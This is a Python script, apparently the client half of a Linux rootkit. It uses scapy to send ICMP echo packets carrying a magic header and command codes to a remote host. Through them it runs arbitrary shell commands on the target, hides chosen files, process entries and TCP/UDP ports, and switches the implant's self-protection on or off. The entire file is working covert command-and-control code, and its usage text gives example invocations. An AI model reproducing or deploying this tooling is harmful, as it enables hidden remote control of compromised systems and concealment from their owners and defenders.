# py3

from scapy.all import *
import struct
import sys


def p32(aint):
    return struct.pack('<I', aint)


def p16(aushort):
    return struct.pack('<H', aushort)


def icmp_echo(payload=b"11112222", dst='127.0.0.1'):
    answer = sr1(IP(dst=dst)/ICMP()/payload, timeout=5)


MAX_LEN = 512


def gen_payload(choice, buffer=''):
    payload = b''
    payload += p32(0xdeadbeef) + p32(choice)
    assert(len(buffer) <= MAX_LEN)

    buffer = buffer.ljust(MAX_LEN, b'\x00')

    payload += buffer
    return payload


def menu(remote, choice, buffer: bytes):
    payload = gen_payload(choice, buffer)
    icmp_echo(payload, remote)


def r_cmd(remote, cmd: bytes):
    menu(remote, 0, cmd)


def r_protect(remote, choice: int):
    ''' r_protect 
    choice (1:protect , 0:unprotect)
    '''
    if choice == 1:
        print("protect")
        menu(remote, 1, b'')
    elif choice == 0:
        print("unprotect")
        menu(remote, 2, b'')


def r_hide_file(remote, path: bytes, choice: int):
    ''' r_hide_file 
    choice (1:hide , 0:unhide)
    '''
    if choice == 1:
        menu(remote, 3, path)
    else:
        menu(remote, 4, path)


def r_hide_port(remote, r_type: str, port: int, choice: int):
    ''' r_hide_port 
    choice (1:hide, 0:unhide)
    '''
    r_choice = -1
    if r_type == 'tcp4':
        if choice == 1:
            r_choice = 7
        else:
            r_choice = 8
    elif r_type == 'udp4':
        if choice == 1:
            r_choice = 11
        else:
            r_choice = 12
    elif r_type == 'tcp6':
        if choice == 1:
            r_choice = 9
        else:
            r_choice = 10
    elif r_type == 'udp6':
        if choice == 1:
            r_choice = 13
        else:
            r_choice = 14
    else:
        print("err type")
        return
    menu(remote, r_choice, p16(port))
    print("hide_port")


usage = ''' 
Usage:
    sudo python3 client.py cmd 127.0.0.1 'echo hello > /tmp/test1'

    sudo python3 client.py hide_port 127.0.0.1 tcp4 8888 1

    sudo python3 client.py protect 127.0.0.1 1

    sudo python3 client.py hide_file 127.0.0.1 /tmp/test 1
    sudo python3 client.py hide_file 127.0.0.1 /proc/8657 1
'''
if __name__ == "__main__":
    try:
        if sys.argv[1] == 'cmd':
            # r_cmd("127.0.0.1", b'echo hello > /tmp/test1')
            r_cmd(sys.argv[2], sys.argv[3].encode())
        elif sys.argv[1] == 'hide_port':
            # r_hide_port("127.0.0.1", "tcp4", 8888, 1)
            r_hide_port(sys.argv[2], sys.argv[3], int(
                sys.argv[4]), int(sys.argv[5]))
        elif sys.argv[1] == 'protect':
            # r_protect("127.0.0.1",1)
            r_protect(sys.argv[2], int(sys.argv[3]))
        elif sys.argv[1] == 'hide_file':
            # r_hide_file("127.0.0.1", b'/tmp/test1', 1)
            # r_hide_file("127.0.0.1", b'/proc/101', 1)
            r_hide_file(sys.argv[2], sys.argv[3].encode(), int(sys.argv[4]))
        else:
            print(usage)
    except Exception:
        print(usage)
